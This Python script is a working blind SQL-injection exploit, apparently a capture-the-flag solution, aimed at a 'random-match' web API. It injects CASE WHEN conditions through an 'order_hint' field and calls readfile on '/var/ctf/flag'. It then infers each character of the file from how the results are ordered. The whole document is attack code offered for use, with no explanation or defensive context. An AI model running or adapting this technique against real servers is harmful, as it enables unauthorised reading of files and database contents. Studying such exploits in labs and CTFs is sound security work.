#!/usr/bin/env python3
import sys
import time
import string
import requests


CHARSET = (
    string.ascii_letters
    + string.digits
    + "{}_-!@#$%^&*()[]<>?:;.,+/="
)


class RandomMatchClient:
    def __init__(self, ip: str, port: str):
        self.candidates = [
            f"http://{ip}:{port}/research/api/random-match",
            f"http://{ip}:{port}/api/random-match",
        ]
        self.session = requests.Session()
        self.url = None

    def fetch_matches(self, order_hint: str, retries: int = 3):
        payload = {"dev": "devmode", "order_hint": order_hint}
        urls = [self.url] if self.url else self.candidates
        last_err = None
        for u in urls:
            for attempt in range(retries):
                resp = self.session.post(u, json=payload, timeout=5)
                if resp.status_code == 429 and attempt < retries - 1:
                    time.sleep(1)
                    continue
                if resp.status_code == 404:
                    last_err = RuntimeError(f"endpoint {u} not found")
                    break
                resp.raise_for_status()
                data = resp.json()
                self.url = u
                return data.get("matches") or []
        if last_err:
            raise last_err
        raise RuntimeError("random-match endpoint unreachable")


def get_baseline_ids(client: RandomMatchClient):
    asc = client.fetch_matches("id")
    desc = client.fetch_matches("-id")
    if not asc or not desc:
        raise RuntimeError("not enough rows to derive ordering baseline")
    asc_id = asc[0].get("id")
    desc_id = desc[0].get("id")
    if asc_id == desc_id:
        raise RuntimeError("only one row available; ordering probe not possible")
    return asc_id, desc_id


def is_condition_true(client: RandomMatchClient, asc_id, desc_id, position: int, ch: str):
    condition = f"substr(readfile('/var/ctf/flag'), {position}, 1) = char({ord(ch)})"
    order_hint = f"CASE WHEN ({condition}) THEN id ELSE -id END"
    matches = client.fetch_matches(order_hint)
    if not matches:
        raise RuntimeError("empty result set while probing condition")
    first_id = matches[0].get("id")
    if first_id == asc_id:
        return True
    if first_id == desc_id:
        return False
    new_asc, new_desc = get_baseline_ids(client)
    if first_id == new_asc:
        return True
    return False


def extract_flag(ip: str, port: str, max_len: int = 64) -> str:
    client = RandomMatchClient(ip, port)
    asc_id, desc_id = get_baseline_ids(client)

    recovered = []
    for pos in range(1, max_len + 1):
        found = False
        for ch in CHARSET:
            if is_condition_true(client, asc_id, desc_id, pos, ch):
                recovered.append(ch)
                found = True
                break
        if not found:
            break
    return "".join(recovered)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.stderr.write(f"Usage: python {sys.argv[0]} <IP> <PORT>\n")
        sys.exit(1)
    flag = extract_flag(sys.argv[1], sys.argv[2])
    print(flag)
